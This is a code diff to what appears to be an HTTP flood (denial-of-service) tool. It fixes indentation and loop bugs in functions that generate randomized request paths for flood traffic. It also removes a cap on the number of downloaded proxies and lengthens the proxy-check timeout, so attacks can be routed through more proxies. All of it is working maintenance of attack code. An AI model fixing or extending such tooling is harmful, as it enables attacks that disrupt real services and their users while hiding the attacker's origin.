@@ -1815,9 +1815,9 @@ class HttpFlood(Thread):
     def _killer_rand_path(self) -> str:
         tmpl = randchoice(self._KILLER_PATHS)
         args = []
-    for _ in range(tmpl.count("%s")):
+        for _ in range(tmpl.count("%s")):
             args.append(ProxyTools.Random.rand_str(randchoice([4, 6, 8, 12, 16])))
-    for _ in range(tmpl.count("%d")):
+        for _ in range(tmpl.count("%d")):
             args.append(randint(1, 999999))
         return tmpl % tuple(args) if args else tmpl
 
@@ -2325,10 +2325,10 @@ def _killer_rand_path_fast(cached_paths):
     from random import choice as rc, randint
     tmpl = rc(cached_paths)
     args = []
-    for _ in tmpl.count("%s"):
+    for _ in range(tmpl.count("%s")):
         from PyRoxy import Tools as PT
         args.append(PT.Random.rand_str(randchoice([4, 6, 8, 12])))
-    for _ in tmpl.count("%d"):
+    for _ in range(tmpl.count("%d")):
         args.append(randint(1, 999999))
     return tmpl % tuple(args) if args else tmpl
 
@@ -3369,14 +3369,9 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
     logger.info(
         f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies downloaded, checking...{bcolors.RESET}!")
-    if len(Proxies) > 10000:
-        from random import sample
-        Proxies = set(sample(list(Proxies), 10000))
-        logger.info(
-            f"{bcolors.WARNING}Capped to {bcolors.OKBLUE}10,000{bcolors.WARNING} random proxies for faster checking{bcolors.RESET}")
     check_threads = min(max(threads, 1000), len(Proxies))
     Proxies = ProxyChecker.checkAll(
-        Proxies, timeout=3, threads=check_threads,
+        Proxies, timeout=7, threads=check_threads,
         url=url.human_repr() if url else "http://httpbin.org/get",
     )
 
